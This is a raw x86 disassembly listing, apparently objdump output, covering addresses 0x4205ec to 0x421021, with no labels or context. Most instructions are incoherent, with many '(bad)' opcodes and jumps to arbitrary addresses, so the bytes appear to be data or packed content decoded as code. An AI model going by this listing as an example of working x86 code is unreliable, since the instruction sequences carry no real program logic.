  4205ec:	push   DWORD PTR [ebx+0x44]
  4205ef:	mov    bh,bh
  4205f1:	imul   esi,esp,0x0
  4205f4:	add    BYTE PTR [edx+eiz*1],bl
  4205f7:	mov    bh,bh
  4205f9:	pop    ebx
  4205fa:	hlt    
  4205fb:	add    BYTE PTR [eax],al
  4205fd:	sbb    al,0xee
  4205ff:	mov    bh,bh
  420601:	dec    ebx
  420602:	jmp    0x0:0xf443ff88
  420609:	sbb    al,0xb4
  42060b:	mov    bh,bh
  42060d:	xor    esi,DWORD PTR [eax-0x33d40078]
  420613:	mov    bh,bh
  420615:	and    ebx,eax
  420617:	mov    bh,bh
  420619:	sbb    ecx,DWORD PTR [edx+0x7e13ff8c]
  42061f:	mov    edi,?
  420621:	or     esi,esp
  420623:	add    BYTE PTR [eax],al
  420625:	sbb    al,0x66
  420627:	mov    edi,?
  420629:	sti    
  42062a:	jns    0x4205b8
  42062c:	push   ebx
  42062e:	ror    DWORD PTR [ebx-0x73941401],1
  420634:	jmp    ebx
  420636:	mov    ch,0x8b
  420638:	inc    DWORD PTR [eax]
	...
  420662:	fistp  DWORD PTR [edx-0x49]
  420665:	mov    ebx,ss
  420667:	loope  0x420627
  420669:	mov    ebx,cs
  42066b:	loope  0x4205f5
  42066d:	mov    ebx,es
  42066f:	loope  0x4205f1
  420671:	mov    WORD PTR [ebx-0x4c73811f],?
  420677:	loope  0x42065f
  420679:	add    ebx,DWORD PTR [ebx+ebx*2]
  42067c:	(bad)  [edx-0x753b1e5d]
  420682:	fwait
  420683:	loope  0x42066b
  420685:	add    ebx,DWORD PTR [ebx+ebx*2]
  420688:	dec    ebx
  420689:	xchg   BYTE PTR [ebx-0x7c79af1f],cl
  42068f:	loope  0x420675
  420691:	test   BYTE PTR [ebx-0x1f],bh
  420694:	fiadd  DWORD PTR [ebx+esi*2+0x6b8506e1]
  42069b:	loope  0x42069f
  42069d:	test   DWORD PTR [ebx-0x1f],esp
  4206a0:	lock test BYTE PTR [ebx-0x1f],bl
  4206a4:	mov    al,0x84
  4206a6:	push   ebx
  4206a7:	loope  0x42065d
  4206a9:	test   BYTE PTR [ebx-0x1f],cl
  4206ac:	mov    al,BYTE PTR [ebx+eax*2+0x3b8496e1]
  4206b3:	loope  0x420637
  4206b5:	test   BYTE PTR [ebx],dh
  4206b7:	loope  0x420711
  4206b9:	test   DWORD PTR [ebx],ebp
  4206bb:	loope  0x420701
  4206bd:	test   DWORD PTR [ebx],esp
  4206bf:	loope  0x4206eb
  4206c1:	test   DWORD PTR [ebx],ebx
  4206c3:	loope  0x42067d
  4206c5:	test   BYTE PTR [eax],al
	...
  4206ef:	adc    esp,ecx
  4206f1:	enter  0xb84,0xe1
  4206f5:	fiadd  DWORD PTR [ebx+eax*1-0x4781d1f]
  4206fc:	loopne 0x4206da
  4206fe:	xchg   ebx,esi
  420700:	loopne 0x420706
  420702:	mov    bl,ch
  420704:	loopne 0x420705
  420706:	repnz fwait
  420708:	loopne 0x420706
  42070a:	and    DWORD PTR [eax+eiz*8-0x1f5bba04],esp
  420711:	cld    
  420712:	sbb    edx,DWORD PTR [eax+eiz*8-0x1f649404]
  420719:	cld    
  42071a:	pop    edi
  42071b:	mov    ds:0x9b53fce0,eax
  420720:	loopne 0x42071e
  420722:	cmp    eax,0xa3fce0a3
  420727:	fwait
  420728:	loopne 0x420726
  42072a:	xchg   ebx,eax
  42072b:	mov    ds:0x9b55fce0,eax
  420730:	loopne 0x42072e
  420732:	popa   
  420733:	mov    ds:0x9ae1fce0,eax
  420738:	loopne 0x420736
  42073a:	cmc    
  42073b:	mov    ds:0x9b11fce0,al
  420740:	loopne 0x42073e
  420742:	add    DWORD PTR [ebx-0x655c0320],esp
  420748:	loopne 0x420746
  42074a:	xchg   ebx,eax
  42074b:	mov    ds:0x9a9bfce0,al
  420750:	loopne 0x42074e
  420752:	outs   dx,DWORD PTR ds:[esi]
	...
  42077b:	add    BYTE PTR [edx-0x65b00320],ah
  420781:	loopne 0x42077f
  420783:	and    DWORD PTR [edx-0x65f60320],esp
  420789:	loopne 0x420787
  42078b:	add    DWORD PTR [edx-0x6a120320],esp
  420791:	loopne 0x42078f
  420793:	shl    DWORD PTR [ebp-0x65ec0321],cl
  420799:	(bad)  
  42079b:	sbb    esp,DWORD PTR [edx-0x65de0321]
  4207a1:	(bad)  
  4207a3:	xor    DWORD PTR [edx+0x6300fcdf],esp
  4207a9:	frndint 
  4207ab:	push   ebp
  4207ad:	pop    ebx
  4207ae:	add    BYTE PTR [eax],al
  4207b0:	inc    edi
  4207b1:	frndint 
  4207b3:	call   FWORD PTR [edi-0x78000328]
  4207b9:	fdivr  st,st(4)
  4207bb:	inc    DWORD PTR [edi-0x68000328]
  4207c1:	fdivr  st,st(4)
  4207c3:	call   DWORD PTR [ebx-0x3a000328]
  4207c9:	pop    ebx
  4207ca:	add    BYTE PTR [eax],al
  4207cc:	(bad)
  4207cf:	push   DWORD PTR [ebp+0x5d00005b]
  4207d5:	fdivr  st,st(4)
  4207d7:	(bad)  
  4207d8:	cmp    eax,0xb9fffcd8
  4207dd:	fdivr  st,st(4)
  4207df:	inc    DWORD PTR [eax]
	...
  420809:	iret   
  42080a:	fdivr  st,st(4)
  42080c:	call   FWORD PTR [ebp-0x28]
  42080f:	cld    
  420810:	call   FWORD PTR [ebp-0x28]
  420813:	cld    
  420814:	(bad)  
  420815:	in     eax,dx
  420816:	xlat   BYTE PTR ds:[ebx]
  420817:	cld    
  420818:	dec    edi
  42081a:	xlat   BYTE PTR ds:[ebx]
  42081b:	cld    
  42081c:	call   FWORD PTR [edi+0x5fffcd7]
  420822:	fdivr  st,st(4)
  420824:	inc    DWORD PTR ds:0x35fffcd8
  42082a:	pop    ebx
  42082b:	add    BYTE PTR [eax],al
  42082d:	cmp    ebx,eax
  42082f:	cld    
  420830:	inc    DWORD PTR [ebp+0x5b]
  420833:	add    BYTE PTR [eax],al
  420835:	das    
  420836:	sar    esp,cl
  420838:	dec    DWORD PTR [ebx-0x2d]
  42083b:	cld    
  42083c:	inc    DWORD PTR ds:0x4500005b
  420842:	iret   
  420843:	cld    
  420844:	(bad)  
  420845:	cmp    edi,ecx
  420847:	cld    
  420848:	call   FWORD PTR [esp+ebp*1]
  42084b:	mov    edi,?
  42084d:	sti    
  42084e:	cwde   
  42084f:	mov    edi,?
  420851:	xrelease xchg BYTE PTR [edi+edi*8-0x736515],cl
  420859:	jecxz  0x42084f
  42085b:	add    BYTE PTR [eax],al
  42085d:	sbb    al,0x82
  42085f:	mov    edi,edi
  420861:	rcl    esi,cl
  420863:	mov    bh,bh
  420865:	retf   
  420866:	mov    cs,WORD PTR [ecx-0x76733c01]
  42086c:	inc    DWORD PTR [eax]
	...
  420896:	mov    ebx,0xb3ff88b2
  42089b:	les    ecx,FWORD PTR [eax-0x77435401]
  4208a1:	jmp    DWORD PTR [ebx-0x6400772e]
  4208a7:	fimul  DWORD PTR [eax-0x76836c01]
  4208ad:	dec    DWORD PTR [ebx+0x1c0000f4]
  4208b3:	loop   0x420840
  4208b5:	(bad)  
  4208b6:	jnp    0x42090e
  4208b8:	mov    edi,edi
  4208ba:	jae    0x4208b0
  4208bc:	add    BYTE PTR [eax],al
  4208be:	sbb    al,0xdf
  4208c0:	add    BYTE PTR [ecx-0x12],al
  4208c3:	push   cs
  4208c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208c5:	jae    0x420888
  4208c7:	mov    ch,0xab
  4208c9:	imul   edi,DWORD PTR [ecx+0x1e3f00b2],0xffffffa2
  4208d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d1:	pop    esi
  4208d2:	mov    eax,0xc16babad
  4208d7:	repz add BYTE PTR [ecx],ah
  4208da:	sbb    al,0xb1
  4208dc:	lods   al,BYTE PTR ds:[esi]
  4208dd:	ins    BYTE PTR es:[edi],dx
  4208de:	scas   eax,DWORD PTR es:[edi]
  4208df:	(bad)  
  4208e0:	enter  0xb25e,0xcf
  4208e4:	lods   al,BYTE PTR ds:[esi]
  4208e5:	bound  ebx,QWORD PTR [ecx+ebp*8]
  4208e8:	call   DWORD PTR [esi+ecx*4+0x5b]
  4208ec:	push   eax
  4208ed:	mov    eax,0xb050957e
  4208f2:	jle    0x42094f
  4208f4:	hlt    
  4208f5:	add    BYTE PTR [eax+0xb2536a],cl
	...
  420923:	xchg   DWORD PTR [eax+0x55],edi
  420926:	ret    
  420927:	jmp    0x420906
  420929:	jbe    0x42092e
  42092b:	pop    ecx
  42092c:	outs   dx,DWORD PTR ds:[esi]
  42092d:	inc    esi
  42092e:	mov    ds:0xad1b6f7a,al
  420933:	cmp    al,0x72
  420935:	out    0x3,eax
  420937:	xchg   ecx,eax
  420938:	pop    ebx
  420939:	es mov al,0x30
  42093c:	jns    0x420946
  42093e:	mov    al,0x4e
  420940:	ins    DWORD PTR es:[edi],dx
  420941:	sti    
  420942:	lods   al,BYTE PTR ds:[esi]
  420943:	cmp    al,0x72
  420945:	out    0x3,eax
  420947:	mov    al,0x5b
  420949:	sub    ebp,DWORD PTR [ebp-0x39fc83c4]
  42094f:	or     eax,0x8c040478
  420954:	pop    ebx
  420955:	mov    bl,0xac
  420957:	cld    
  420958:	jnp    0x420925
  42095a:	ret    0x6ef7
  42095d:	(bad)  
  42095e:	mov    al,ds:0xefdd7b
  420963:	add    BYTE PTR [edx-0x45],ch
  420966:	mov    cl,0xfc
  420968:	push   0xffffffc0
  42096a:	ret    0xdd63
  42096d:	fld    DWORD PTR [eax]
  42096f:	enter  0xb369,0xb1
  420973:	mov    esp,0x4bc29b7b
  420978:	(bad)  
  42097a:	add    bl,cl
  42097c:	ja     0x420919
  42097e:	(bad)
  420981:	test   dl,al
  420983:	scas   eax,DWORD PTR es:[edi]
  420984:	data16 jns 0x420931
	...
  4209af:	add    BYTE PTR [ebp-0x53598c99],bh
  4209b5:	fwait
  4209b6:	add    cl,ch
  4209b8:	pop    ds
  4209b9:	sar    bh,0xa3
  4209bc:	xlat   BYTE PTR ds:[ebx]
  4209bd:	ins    BYTE PTR es:[edi],dx
  4209be:	pop    edi
  4209bf:	push   edi
  4209c0:	mov    ah,0x99
  4209c2:	outs   dx,BYTE PTR ds:[esi]
  4209c3:	push   edi
  4209c4:	mov    bh,0x6a
  4209c6:	ins    DWORD PTR es:[edi],dx
  4209c7:	inc    edi
  4209c8:	retf   
  4209c9:	jns    0x420a39
  4209cb:	push   ebp
  4209cc:	int    0x68
  4209ce:	jb     0x420a20
  4209d0:	mov    edx,0x18287177
  4209d5:	aas    
  4209d6:	jmp    FWORD PTR ds:0x40466883
  4209dc:	mov    WORD PTR [ecx+0x51],?
  4209df:	adc    BYTE PTR [esi+0x1fdf0079],al
  4209e5:	call   0x2763:0x687f0c72
  4209ec:	xchg   DWORD PTR [eax+0x63],esi
  4209ef:	xor    al,0x7f
  4209f1:	ins    BYTE PTR es:[edi],dx
  4209f2:	jo     0x420a04
  4209f4:	jb     0x420a6d
  4209f6:	aas    
  4209f7:	jmp    0x1c44651b
  4209fc:	mov    edi,0xc2d0566c
  420a01:	addr16 dec ebp
  420a03:	(bad)  
  420a04:	pop    ecx
  420a05:	jne    0x420a73
  420a07:	int3   
  420a08:	pop    ds
  420a09:	or     al,BYTE PTR [edx]
  420a0b:	mov    ah,0xc1
  420a0d:	jno    0x420a6e
  420a0f:	mov    ecx,0xb6637551
	...
  420a3c:	add    BYTE PTR [eax+0x76],dl
  420a3f:	inc    esi
  420a40:	ror    BYTE PTR [ebx+0x1e430079],0x8f
  420a47:	ins    DWORD PTR es:[edi],dx
  420a48:	mov    BYTE PTR [ebx-0x72749870],al
  420a4e:	jge    0x420ac2
  420a50:	nop
  420a51:	pop    esi
  420a52:	fdiv   st(4),st
  420a54:	mov    edx,0x63961e
  420a59:	test   eax,0x966f6f07
  420a5e:	sbb    DWORD PTR [ecx+0x64],esp
  420a61:	xchg   edi,eax
  420a62:	mov    ch,0x6f
  420a64:	jae    0x420a6b
  420a66:	pop    eax
  420a67:	test   BYTE PTR [ecx],al
  420a69:	cmp    bh,BYTE PTR [edx-0x4da7ab90]
  420a6f:	ins    BYTE PTR es:[edi],dx
  420a70:	push   eax
  420a71:	fs stos DWORD PTR es:[edi],eax
  420a73:	fs inc ecx
  420a75:	add    eax,0x36003158
  420a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a7b:	popa   
  420a7c:	popa   
  420a7d:	sub    DWORD PTR [edx-0x45e896c0],edi
  420a83:	pop    edi
  420a84:	je     0x420a98
  420a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a87:	jne    0x420aca
  420a89:	mov    ch,0x57
  420a8b:	gs add cl,bh
  420a8e:	mov    ecx,0xba196568
  420a93:	inc    edx
  420a94:	imul   esi,DWORD PTR [ecx-0x4affc246],0xa9654356
  420a9e:	adc    al,0x72
  420aa0:	jb     0x420aa2
	...
  420aca:	xchg   edi,eax
  420acb:	mov    edx,0xa535746a
  420ad0:	imul   esp,DWORD PTR [ebx+0x58],0xffffffa4
  420ad4:	outs   dx,DWORD PTR ds:[esi]
  420ad5:	add    ch,ah
  420ad7:	push   esp
  420ad8:	push   ebx
  420ad9:	imul   ebp,DWORD PTR [ecx-0x46],0xa564683f
  420ae0:	push   eax
  420ae1:	outs   dx,DWORD PTR ds:[esi]
  420ae2:	mov    al,0xaa
  420ae4:	push   0x76154c74
  420ae9:	je     0x420b53
  420aeb:	push   edi
  420aec:	sub    BYTE PTR [ecx],al
  420aee:	jp     0x420aaa
  420af0:	jo     0x420b3e
  420af2:	xchg   esp,eax
  420af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420af4:	jo     0x420b3b
  420af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420af8:	imul   esi,DWORD PTR [edx+0x1c],0xfffffff2
  420afc:	add    BYTE PTR [ebx],dl
  420afe:	pop    ds
  420aff:	pop    esi
  420b00:	mov    dh,0x73
  420b02:	scas   al,BYTE PTR es:[edi]
  420b03:	shl    BYTE PTR [edi+0xf1dd6f],1
  420b09:	push   edi
  420b0a:	sbb    al,0x5
  420b0c:	mov    bl,0x62
  420b0e:	jge    0x420b60
  420b10:	mov    al,ds:0xa8317b53
  420b15:	addr16 jns 0x420b40
  420b18:	mov    ah,0x30
  420b1a:	cs xchg ebp,eax
  420b1c:	stos   BYTE PTR es:[edi],al
  420b1d:	pop    esi
  420b1e:	ins    BYTE PTR es:[edi],dx
  420b1f:	xor    eax,0xc4706cac
  420b24:	add    BYTE PTR [ebx],ah
  420b26:	push   ds
  420b27:	je     0x420adf
  420b29:	ins    BYTE PTR es:[edi],dx
  420b2a:	aas    
  420b2b:	daa    
  420b2c:	mov    ch,0x70
	...
  420b56:	add    BYTE PTR [edi],cl
  420b58:	(bad)  
  420b59:	mov    esi,0xb0754e66
  420b5e:	inc    ebx
  420b60:	pop    esp
  420b61:	push   es
  420b62:	dec    ebp
  420b63:	sub    al,0x67
  420b65:	stos   BYTE PTR es:[edi],al
  420b66:	dec    edi
  420b67:	fldenv cs:[ebp+0xd52f62]
  420b6e:	and    eax,0x6cb6741e
  420b73:	jmp    DWORD PTR [esi-0x4b]
  420b76:	jo     0x420bc7
  420b78:	push   ss
  420b79:	(bad)  
  420b7a:	bound  eax,QWORD PTR [eax+edi*4]
  420b7d:	add    BYTE PTR [edi+0x6dac021c],ch
  420b83:	add    BYTE PTR [edx],cl
  420b85:	lods   al,BYTE PTR ds:[esi]
  420b86:	jno    0x420b77
  420b88:	scas   eax,DWORD PTR es:[edi]
  420b89:	mov    esi,0xc3a6f866
  420b8e:	jmp    DWORD PTR [ebx-0x4f]
  420b91:	add    eax,0xb317cf6c
  420b96:	pusha  
  420b97:	rcl    DWORD PTR [ebx],0xac
  420b9a:	ds sbb al,0x5b
  420b9d:	popa   
  420b9e:	add    ebx,edx
  420ba0:	inc    ebx
  420ba1:	lea    ebx,[edi-0x5070c017]
  420ba7:	fld    DWORD PTR [ebx+0x7b]
  420baa:	mov    al,ds:0x3545aea
  420baf:	fiadd  DWORD PTR [ebx-0x73]
  420bb2:	lahf   
  420bb3:	pop    esp
  420bb4:	inc    edi
  420bb5:	xchg   BYTE PTR [esi+0x4b35b7e],dh
	...
  420be3:	add    BYTE PTR [ecx+0x40],ah
  420be6:	pop    ebx
  420be7:	(bad)  
  420be8:	jo     0x420c29
  420bea:	push   esp
  420beb:	test   al,0x7e
  420bed:	and    ecx,DWORD PTR [eax-0x56]
  420bf0:	jg     0x420c39
  420bf2:	inc    esp
  420bf3:	ret    
  420bf4:	jmp    0x420bcf
  420bf6:	pop    esp
  420bf7:	add    ebx,DWORD PTR [ecx+0x40]
  420bfa:	xor    edx,edx
  420bfc:	ds dec ebp
  420bfe:	cmp    ch,BYTE PTR [ebx-0x43dbb6c0]
  420c04:	or     bl,BYTE PTR [ebx-0x2f]
  420c07:	add    bl,BYTE PTR [ecx+0x40]
  420c0a:	adc    ecx,eax
  420c0c:	dec    eax
  420c0d:	or     BYTE PTR ds:[eax-0x5e02dbc2],ch
  420c14:	cmp    BYTE PTR [edi+eiz*8],bl
  420c17:	add    ebp,DWORD PTR [eax]
  420c19:	pop    esp
  420c1a:	es lahf 
  420c1c:	ucomiss xmm6,xmm0
  420c1f:	mov    ah,0xf
  420c21:	inc    eax
  420c22:	cld    
  420c23:	retf   0x40f9
  420c26:	(bad)  
  420c27:	add    edi,DWORD PTR [ebx+ebx*2+0x31ef9ea6]
  420c2e:	shr    BYTE PTR [ecx-0x4b29b601],0xdf
  420c35:	inc    ebx
  420c36:	mov    ecx,0xce4efc9e
  420c3b:	mov    ch,0xd2
  420c3d:	sbb    eax,DWORD PTR [eax]
  420c3f:	jmp    0xa6413463
  420c44:	stos   BYTE PTR es:[edi],al
  420c45:	dec    ebp
  420c46:	push   eax
  420c47:	fwait
	...
  420c70:	add    BYTE PTR [esi+0x4f],dh
  420c73:	pop    edi
  420c74:	xchg   ebp,eax
  420c75:	call   0x6c40:0x7d867229
  420c7c:	test   BYTE PTR [eax+0x4d],dl
  420c7f:	jb     0x420c11
  420c81:	jne    0x420cc1
  420c83:	aas    
  420c84:	jmp    0x9a4461a8
  420c89:	mov    dl,0x4c
  420c8b:	inc    ecx
  420c8c:	je     0x420c5f
  420c8e:	dec    edx
  420c8f:	arpl   WORD PTR [edi-0x34],dx
  420c92:	sbb    al,0x67
  420c94:	pop    ebx
  420c95:	fwait
  420c96:	cmp    esi,DWORD PTR [esi+eax*2-0x56]
  420c9a:	push   ecx
  420c9b:	aas    
  420c9c:	jmp    0x2e4133c0
  420ca1:	or     DWORD PTR [eax+edx*2+0x3b],0xffffff87
  420ca6:	dec    esi
  420ca7:	pop    edi
  420ca8:	cmp    eax,0x3e7228b3
  420cad:	jle    0x420cf0
  420caf:	ins    BYTE PTR es:[edi],dx
  420cb0:	or     al,0xe9
  420cb2:	cmp    eax,0x47871561
  420cb7:	outs   dx,BYTE PTR ds:[esi]
  420cb8:	daa    
  420cb9:	jg     0x420d00
  420cbb:	arpl   WORD PTR [edx],bx
  420cbd:	(bad)  
  420cbf:	cld    
  420cc0:	xor    BYTE PTR [edi],bl
  420cc2:	push   ds
  420cc3:	arpl   bp,si
  420cc5:	outs   dx,DWORD PTR ds:[esi]
  420cc6:	dec    edx
  420cc7:	addr16 (bad) 
  420cc9:	mov    esi,0xd219634c
  420cce:	inc    edi
  420ccf:	data16 sar BYTE PTR [ebx+0xcf473d],1
	...
  420cfe:	retf   
  420cff:	cdq    
  420d00:	add    BYTE PTR [edi+0x1f],dl
  420d03:	push   ds
  420d04:	arpl   bp,dx
  420d06:	pusha  
  420d07:	dec    ebp
  420d08:	jb     0x420d0a
  420d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d0b:	stc    
  420d0c:	push   0x74
  420d0e:	add    DWORD PTR ds:0x866656f,0x9d8c726c
  420d18:	cld    
  420d19:	call   FWORD PTR [ebx]
  420d1b:	pop    esi
  420d1c:	ins    BYTE PTR es:[edi],dx
  420d1d:	jae    0x420cb0
  420d1f:	push   cs
  420d20:	imul   esp,DWORD PTR [ebp-0x65],0x48fffcab
  420d27:	pop    esi
  420d28:	dec    ecx
  420d29:	jne    0x420cb4
  420d2b:	or     BYTE PTR [esi+0x42],ah
  420d2e:	pushf  
  420d2f:	pop    es
  420d30:	bound  edx,QWORD PTR [edx+ebx*4-0x56]
  420d34:	gs mov al,fs:0x6761649e
  420d3b:	pop    edi
  420d3c:	mov    DWORD PTR [ecx],eax
  420d3e:	inc    edx
  420d3f:	cli    
  420d40:	jo     0x420d96
  420d42:	pop    esp
  420d43:	cld    
  420d44:	addr16 inc ebx
  420d46:	sub    cl,BYTE PTR [edx]
  420d48:	imul   esi,DWORD PTR [ebp+esi*8+0x5b],0xffffffb7
  420d4d:	add    dh,BYTE PTR [esi]
  420d4f:	add    esp,DWORD PTR [edx+0x65]
  420d52:	adc    eax,0x201325f
  420d57:	cli    
  420d58:	jo     0x420da7
  420d5a:	sub    bh,bl
  420d5c:	jno    0x420dca
  420d5e:	and    BYTE PTR [ecx],bl
  420d60:	data16 ins BYTE PTR es:[edi],dx
	...
  420d8a:	add    BYTE PTR [eax],ah
  420d8c:	mov    eax,ds:0x9e206d5d
  420d91:	cld    
  420d92:	call   DWORD PTR [edx+0x48434c5d]
  420d98:	(bad)  
  420d99:	ins    BYTE PTR es:[edi],dx
  420d9a:	push   ebx
  420d9b:	xchg   ecx,eax
  420d9c:	or     DWORD PTR [esi+0x6e],esp
  420d9f:	and    bl,BYTE PTR [esi+0x5e9efffc]
  420da5:	inc    ecx
  420da6:	js     0x420df4
  420da8:	pop    es
  420da9:	dec    ebp
  420daa:	jb     0x420dc8
  420dac:	mov    eax,ds:0xb4ef62a1
  420db1:	add    BYTE PTR [edi+0x739ff51e],ch
  420db7:	icebp  
  420db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420db9:	test   al,0x5e
  420dbb:	ret    0xa4a5
  420dbe:	(bad)  
  420dbf:	sar    dh,0xb8
  420dc2:	pusha  
  420dc3:	mov    ecx,0xcb66acf1
  420dc8:	out    0xba,eax
  420dca:	data16 shl ch,0x9f
  420dce:	jno    0x420dec
  420dd0:	fstp   QWORD PTR [edi-0x5b194d8f]
  420dd6:	xor    BYTE PTR [esi-0x5a],cl
  420dd9:	pushf  
  420dda:	imul   eax,DWORD PTR [eax+0x1c8900c4],0x1
  420de1:	scas   eax,DWORD PTR es:[edi]
  420de2:	bound  edi,QWORD PTR [ebp+0x38]
  420de5:	lahf   
  420de6:	push   eax
  420de7:	jo     0x420e1b
  420de9:	lahf   
  420dea:	pop    esi
  420deb:	cmp    DWORD PTR [ebp-0x5a],0x47
	...
  420e16:	add    BYTE PTR [eax],al
  420e18:	arpl   WORD PTR [eax+0x307d61a5],bx
  420e1e:	add    al,0x95
  420e20:	sbb    al,0x7d
  420e22:	lahf   
  420e23:	jae    0x420e89
  420e25:	test   DWORD PTR [eax-0x57dcc194],ebp
  420e2b:	inc    ebp
  420e2c:	dec    esi
  420e2d:	ins    DWORD PTR es:[edi],dx
  420e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e2f:	push   eax
  420e30:	xor    BYTE PTR [edx-0x61],dh
  420e33:	pop    esi
  420e34:	inc    ecx
  420e35:	les    eax,FWORD PTR [eax]
  420e37:	push   cs
  420e38:	sbb    al,0x81
  420e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e3b:	inc    eax
  420e3c:	addr16 mov cs:0x173,eax
  420e41:	jge    0x420df2
  420e43:	data16 clc 
  420e45:	ret    
  420e46:	add    BYTE PTR [eax+0x1c],ah
  420e49:	and    DWORD PTR [ebp-0x25a502ad],0xcc3fe6aa
  420e53:	mov    ebp,0x3cc3fed
  420e58:	sbb    DWORD PTR [ebx-0x56],ebx
  420e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e5c:	fmul   QWORD PTR [eax-0x34]
  420e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e60:	iret   
  420e61:	aas    
  420e62:	mov    al,0xa5
  420e64:	int3   
  420e65:	dec    esi
  420e66:	enter  0xbca5,0x3f
  420e6a:	out    0x3,eax
  420e6c:	dec    ebp
  420e6d:	pop    ebx
  420e6e:	mov    dh,0xa7
  420e70:	mov    esi,0xafac8d23
  420e75:	inc    ebx
  420e76:	mov    BYTE PTR [edi+0x38450c2],ah
	...
  420ea4:	add    BYTE PTR [ecx+0x4df28c46],dh
  420eaa:	test   DWORD PTR [ebx+0x745b87a7],eax
  420eb0:	add    DWORD PTR [ecx+0x7ab1774a],edx
  420eb6:	inc    ebp
  420eb7:	pop    ebx
  420eb8:	sahf   
  420eb9:	cmp    bl,BYTE PTR [ebx+0x54]
  420ebc:	mov    cl,0x7e
  420ebe:	dec    ecx
  420ebf:	sbb    dh,dl
  420ec1:	cmp    DWORD PTR [edi],edi
  420ec3:	cmp    ebp,DWORD PTR [eax+0x396d5e3]
  420ec9:	outs   dx,BYTE PTR ds:[esi]
  420eca:	inc    eax
  420ecb:	inc    esi
  420ecc:	lds    eax,FWORD PTR [ebx+0x40]
  420ecf:	inc    ebp
  420ed0:	leave  
  420ed1:	ds push esp
  420ed3:	and    al,0xbc
  420ed5:	add    bl,BYTE PTR [ebx-0x3f]
  420ed8:	add    ecx,DWORD PTR [esi+0x40]
  420edb:	push   es
  420edc:	shr    DWORD PTR [esi],cl
  420ede:	inc    eax
  420edf:	sbb    DWORD PTR [ebx-0x5104c3af],edi
  420ee5:	ds and bh,bh
  420ee8:	ret    0xd59b
  420eeb:	xor    eax,0x3fee03
  420ef0:	push   cs
  420ef1:	pop    ebp
  420ef2:	inc    ecx
  420ef3:	ins    DWORD PTR es:[edi],dx
  420ef4:	cli    
  420ef5:	mov    ds:0x1fe06322,al
  420efa:	test   al,0xfe
  420efc:	mov    edx,0xd94d3e92
  420f01:	mov    al,BYTE PTR [edi+0x49]
  420f04:	les    esp,FWORD PTR [esi+0x2d0094]
	...
  420f32:	pop    ds
  420f33:	sub    DWORD PTR [ebx-0x3a],esp
  420f36:	xchg   edx,eax
  420f37:	inc    edi
  420f38:	jae    0x420efe
  420f3a:	push   esp
  420f3b:	cmp    BYTE PTR [edi-0x5c],dh
  420f3e:	xchg   DWORD PTR [eax+eax*1+0x63291f63],edx
  420f45:	xchg   BYTE PTR [ebx+ecx*2+0x63],bl
  420f49:	mov    BYTE PTR [ebx+0x38],bh
  420f4c:	dec    ecx
  420f4d:	test   BYTE PTR [esi-0x6c],ah
  420f50:	add    BYTE PTR [esi],cl
  420f52:	pop    ds
  420f53:	sub    DWORD PTR [ebx-0x7a],esp
  420f56:	in     al,dx
  420f57:	cmp    DWORD PTR [edi+ebx*4-0x42],esi
  420f5b:	inc    eax
  420f5c:	jae    0x420ee2
  420f5e:	ret    0x3f4c
  420f61:	jmp    0x30418f85
  420f66:	lods   eax,DWORD PTR ds:[esi]
  420f67:	sub    BYTE PTR [ebx+0x51],ah
  420f6a:	lods   al,BYTE PTR ds:[esi]
  420f6b:	sub    DWORD PTR [esi+0x40],ebp
  420f6e:	mov    ebp,0x204c6447
  420f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f74:	(bad)  
  420f75:	sbb    dh,BYTE PTR [ebx-0x54c6b2c1]
  420f7b:	inc    esi
  420f7c:	inc    ecx
  420f7d:	xor    al,0x8e
  420f7f:	dec    edx
  420f80:	arpl   WORD PTR [edi],dx
  420f82:	ins    BYTE PTR es:[edi],dx
  420f83:	sub    DWORD PTR [ecx+0x4],esi
  420f86:	outs   dx,BYTE PTR ds:[esi]
  420f87:	aam    0xfc
  420f89:	scas   al,BYTE PTR es:[edi]
  420f8a:	push   ds
  420f8b:	sub    DWORD PTR [ebx+0x6],esp
  420f8e:	arpl   WORD PTR [esi+0x73],ax
  420f91:	add    BYTE PTR [eax],dh
  420f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f94:	pop    ebp
  420f95:	ins    BYTE PTR es:[edi],dx
	...
  420fbe:	add    BYTE PTR [eax+0x6e003df5],cl
  420fc4:	pop    ecx
  420fc5:	inc    ebx
  420fc6:	mov    DWORD PTR gs:[ebp-0x61a89a91],esp
  420fcd:	pop    ebp
  420fce:	ins    DWORD PTR es:[edi],dx
  420fcf:	pop    eax
  420fd0:	cdq    
  420fd1:	cld    
  420fd2:	call   DWORD PTR [esp+esi*8+0x72]
  420fd6:	popa   
  420fd7:	inc    ebp
  420fd8:	add    DWORD PTR [eax],esi
  420fda:	xor    dh,BYTE PTR [ebx]
  420fdc:	sti    
  420fdd:	push   0xd558456c
  420fe2:	add    BYTE PTR [esi-0x7e939e00],ah
  420fe8:	adc    eax,0x5a66575
  420fed:	jno    0x421054
  420fef:	test   BYTE PTR [eax+0x6f],bl
  420ff2:	push   0x3368fc98
  420ff7:	inc    edi
  420ff8:	mov    esi,0x57b16c60
  420ffd:	jne    0x420fff
  420fff:	int3   
  421000:	std    
  421001:	jo     0x421068
  421003:	xchg   esi,edi
  421005:	popa   
  421006:	je     0x420fbe
  421008:	or     DWORD PTR [esi+0x63],ebx
  42100b:	dec    esi
  42100c:	mov    dl,0x6e
  42100e:	ins    BYTE PTR es:[edi],dx
  42100f:	inc    esp
  421010:	pop    edi
  421011:	ja     0x421013
  421013:	cmp    al,0xf9
  421015:	jo     0x42107c
  421017:	inc    edi
  421018:	stc    
  421019:	popa   
  42101a:	je     0x421022
  42101c:	or     eax,0x2096162
  421021:	push   edx
